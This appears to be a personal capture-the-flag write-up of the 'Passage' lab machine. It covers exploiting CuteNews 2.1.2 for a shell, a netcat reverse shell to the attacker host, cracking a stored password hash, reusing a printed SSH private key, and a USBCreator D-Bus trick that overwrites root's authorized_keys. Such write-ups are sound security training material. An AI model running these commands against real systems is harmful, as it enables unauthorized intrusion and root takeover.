##### port scan
`nmap -p- -sSCV 10.129.8.47  --min-rate 999`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### port 80 enum
http://10.129.8.47/CuteNews/ - Powered by [CuteNews 2.1.2](http://cutephp.com/cutenews/)

vuln found on this app
> https://www.exploit-db.com/exploits/48800

` python3 48800.py`

```
Dropping to a SHELL
============================

command > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
to get a full shell
`command > nc 10.10.16.47 4444 -e /bin/bash`

`python -c 'import pty;pty.spawn("/bin/bash")'`

check the port listening on host
`tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN    `

use chisel to create tunnel, for attack host to access target port 631
http://127.0.0.1:631/ru
on target host
`www-data@passage:/tmp$ ./chisel server --port 8001`

```
./chisel server --port 8001
2025/12/24 23:35:41 server: Fingerprint VpKvi02CiIzKHH9TU8tAy3v2siyLYiOkgC8seCljBo4=
2025/12/24 23:35:41 server: Listening on http://0.0.0.0:8001
2025/12/24 23:37:04 server: session#1: Client version (1.11.3-0kali1) differs from server version (1.11.3)
2025/12/24 23:37:11 server: session#2: Client version (1.11.3-0kali1) differs from server version (1.11.3)
```
on kali
`└─$ chisel client 10.129.8.47:8001 631:localhost:631`
```
2025/12/25 18:37:09 client: Connecting to ws://10.129.8.47:8001
2025/12/25 18:37:09 client: tun: proxy#631=>localhost:631: Listening
2025/12/25 18:37:10 client: Connected (Latency 91.189883ms)
```

`└─$ sudo dirsearch -u http://127.0.0.1:631  `
```
18:44:28] 200 -    2KB - /classes.jsp
[18:44:33] 200 -    2KB - /de
[18:44:36] 200 -    3KB - /es
[18:44:41] 200 -    3KB - /help
[18:44:41] 200 -    3KB - /help/
[18:44:41] 200 -    3KB - /help.htm
[18:44:41] 200 -    3KB - /helpadmin
[18:44:44] 200 -    2KB - /jobs
[18:45:02] 403 -  342B  - /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
[18:45:02] 403 -  342B  - /remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
[18:45:03] 200 -  901B  - /robots.txt
[18:45:04] 200 -    3KB - /ru
```

`www/html/CuteNews/cdata/users$ cat /etc/passwd | grep bash`
```
<tml/CuteNews/cdata/users$ cat /etc/passwd | grep bash                       
root:x:0:0:root:/root:/bin/bash
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
```
#### lateral move

under /var/www/html/CuteNews/cdata/users some php files


`cat b0.php`
```
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19
`└─$ hashcat -a 0 -m 1400 hash /home/ed/tools/rockyou.txt 
```
`└─$ echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19" | base64 -d`

```
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}} 
```
`└─$ hash-identifier 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
```
Possible Hashs:
[+] SHA-256
[+] Haval-256
```

use hashcat to crack the credential,  bcrypt

e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb4...7273cd
Time.Started.....: Fri Dec 26 14:02:50 2025 (0 secs)
Time.Estimated...: Fri Dec 26 14:02:50 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/ed/tools/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2492.3 kH/s (0.55ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: newzealand -> whitetiger
Hardware.Mon.#01.: Util: 19%
```
now a credential is cracked paul atlanta1, as paul is a user on host, su this.
Copy priv key of ssh, ssh this user

```
www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
su paul
Password: atlanta1

paul@passage:/var/www/html/CuteNews/cdata/users$ id
id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
```
```
paul@passage:~/.ssh$ ls
ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
paul@passage:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----

```
on my acttack machine
```
└─$ ssh -i id_rsa paul@10.129.7.226
paul@passage:~$ 
```

under paul .ssh, view the authorized_keys
`cat authorized_keys `
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```
it is clearly, this pub key is owned by nadav another user in this host

`└─$ ssh -i id_rsa nadav@10.129.6.178`
```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

this user is in sudo 27 group 

Sudo version 1.8.16

`nadav@passage:~$ cat .viminfo`
```
viminfo is mark of vim command
#File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

#Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

#History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	"	12	7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	"	2	0
	.	2	0
	+	2	0
```
view this 2 files
`nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf`
```
<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>

  <!-- Only root can own the service -->
  <policy user="root">
    <allow own="com.ubuntu.USBCreator"/>
  </policy>

  <!-- Allow anyone to invoke methods (further constrained by
       PolicyKit privileges -->
```
anyone can invole this, google "USBCreator", find a vuln of it
> https://gist.github.com/noobpk/a4f0a029488f37939c4df6e20472501d

`└─$ ssh-keygen -t rsa `
```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/edi/.ssh/id_rsa): /tmp/key/id_rsa
Enter passphrase for "/tmp/key/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/key/id_rsa
Your public key has been saved in /tmp/key/id_rsa.pub
The key fingerprint is:
SHA256:Ncv2SVo3Su2ay01jUj+O04DJ1amB6KbuC69mcsmBfeM edi@kali
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|          + . . .|
|         + + + o |
|    o   S = B B  |
|   . o o + X O o |
|    ..= + . = B..|
|   . *oE   . Ooo.|
|    =.+=.   =oo. |
+----[SHA256]-----+
```                   
copy new generated pub key to target host under /tmp
`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuWakc5QHbIWV+6iTdtP+V/AS41p0dxBH128YjrNWFRoCbCM7BhlqVmQ6ddfQb8Pc60XfrsPDpzzZsrliBOXCFn8y4EjrG1jzncCfQAHrORNt1gFOYt0dz3KGX3rujJC4DFwPGamptq/erJh/yjVQvqQtCy1Pu34zsqsFDOVcAV7iaCN1oKFTutHQXfsNABryxgcvgPYRN5qozuNvpsas= edi@kali" > authorized_keys`

involk USBCreator to move new pub key to root/.ssh/
`nadav@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/authorized_keys /root/.ssh/authorized_keys true `

now be able to ssh as root
`└─$ ssh -i id_rsa root@10.129.6.178`
```
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### lesson learned
- search for application folder for sensitive file or credentials caredfully
- group on linux - a way to ES
- .viminfo
